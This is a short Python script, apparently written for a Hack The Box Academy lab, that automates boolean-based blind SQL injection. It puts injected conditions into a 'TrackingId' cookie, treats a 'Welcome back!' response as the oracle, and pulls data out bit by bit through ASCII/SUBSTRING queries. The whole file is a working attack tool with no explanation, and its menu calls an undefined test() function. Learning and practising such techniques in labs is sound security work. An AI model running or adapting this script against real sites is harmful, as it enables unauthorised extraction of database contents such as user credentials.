import requests,sys,json
from urllib.parse import quote_plus

def url(): 
    return sys.argv[1]

def target():
    session = requests.Session()
    session.get(url())
    return session.cookies.get_dict()["TrackingId"]

def oracle(q):
    payload = quote_plus(f"{target()}' AND ({q})--" )
    cookies = {
        "TrackingId": payload
    }
    response = requests.get(url(),cookies=cookies)
    return "Welcome back!" in response.text  # Observe the response, and modify it

# confirm oracle can run
"""
assert oracle("1=1")
assert oracle("1=0")
"""

# Calculate the Length
def dumpNumber(q):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"({q}) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

# Dumping string
def dumpString(q, length):
    val = ""
    for i in range(1, length+1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

func = int(input("""HTB_ACADEMY_ORACLE
(1) Get Length
(2) Get Name
Your Option : """))

if func == 0:
    test()
elif func == 1:
    payload = input("Payload : ")
    print(dumpNumber(payload))
elif func == 2:
    payload = input("Payload : ")
    string, length=payload.rsplit(maxsplit=1)
    print(dumpString(string,int(length)))
